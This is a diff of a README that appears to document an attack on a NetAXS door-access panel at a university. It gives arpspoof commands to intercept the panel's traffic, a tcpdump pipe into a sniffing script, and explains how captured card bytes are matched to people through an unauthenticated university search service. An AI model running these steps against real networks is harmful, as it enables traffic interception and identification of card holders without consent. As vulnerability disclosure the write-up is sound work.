@@ -9,7 +9,7 @@ The most important vulnerabilities which led to this attack has been already app
 ``` sudo arpspoof -i eth0 [IP of NetAXS] -t [IP of Gateway] ```
 ``` sudo arpspoof -i eth0 [IP of Gateway] -t [IP of NetAXS] ```
 ## TCPDump /w our python script
-``` sudo tcpdump -X -i eth0 tcp and ether src [MAC of NetAXS] | python3 netaxs_muni.py ```
+``` sudo tcpdump -X -i eth0 tcp and ether src [MAC of NetAXS] | python3 netaxs_sniff.py ```
 
 script netaxs_sniff.py will take the 4 bytes from packet (marked as "CARD HERE" in the example), converts them to endianity compatible with IS of my university, then uses old search interface from "Úschovna" which is capable
 of search based on the card number (even for unauthentized users!!). Because NetAXS gives us only last 4 bytes (ignores the first one), the script tries most used prefixes used on my university (06, 08, 0E)
